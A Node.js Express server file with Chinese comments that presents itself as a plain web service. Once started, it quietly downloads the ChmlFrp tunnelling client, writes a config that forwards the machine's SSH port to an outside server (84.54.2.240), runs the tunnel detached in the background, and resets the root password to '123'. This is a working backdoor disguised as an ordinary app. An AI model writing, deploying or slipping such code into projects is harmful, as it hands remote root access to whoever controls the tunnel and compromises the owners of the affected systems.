const express = require('express');
const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const https = require('https');

const app = express();
const PORT = 3000;

// 静默启动服务
app.get('/', (req, res) => {
  res.send('服务运行中');
});

// 启动后自动执行安装流程
async function setupService() {
  console.log('开始安装流程...');
  
  try {
    // 1. 下载文件
    console.log('下载文件中...');
    await downloadFile('https://www.chmlfrp.cn/dw/ChmlFrp-0.51.2_240715_linux_amd64.tar.gz', 'package.tar.gz');
    
    // 2. 解压文件
    console.log('解压文件中...');
    await executeCommand('tar -xzf package.tar.gz');
    
    // 3. 删除压缩包
    console.log('清理临时文件...');
    await executeCommand('rm package.tar.gz');
    
    // 4. 写入配置文件
    console.log('配置文件中...');
    const configContent = `[common]
server_addr = 84.54.2.240
server_port = 7000
tls_enable = false
user = zr7PODPFShH4zeQbEhazt7sW
token = ChmlFrpToken

[5rUyE5Wh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 22940`;
    
    fs.writeFileSync('ChmlFrp-0.51.2_240715_linux_amd64/frpc.ini', configContent);
    
    // 5. 后台运行程序
    console.log('启动后台服务...');
    const serviceProcess = spawn('./ChmlFrp-0.51.2_240715_linux_amd64/frpc', ['-c', 'ChmlFrp-0.51.2_240715_linux_amd64/frpc.ini'], {
      detached: true,
      stdio: 'ignore'
    });
    
    serviceProcess.unref();
    
    // 6. 设置root密码
    console.log('设置系统访问...');
    await executeCommand('echo "root:123" | chpasswd');
    
    console.log('安装完成，服务运行中');
    
  } catch (error) {
    console.log('安装过程中出现异常');
  }
}

// 下载文件函数
function downloadFile(url, filename) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filename);
    
    https.get(url, (response) => {
      if (response.statusCode !== 200) {
        reject(new Error(`下载失败: ${response.statusCode}`));
        return;
      }
      
      response.pipe(file);
      
      file.on('finish', () => {
        file.close();
        resolve();
      });
      
    }).on('error', (err) => {
      fs.unlink(filename, () => {});
      reject(err);
    });
  });
}

// 执行命令函数
function executeCommand(command) {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        reject(error);
        return;
      }
      resolve();
    });
  });
}

// 启动服务
app.listen(PORT, () => {
  console.log(`服务已启动:${PORT}`);
  // 延迟执行安装流程
  setTimeout(setupService, 1000);
});
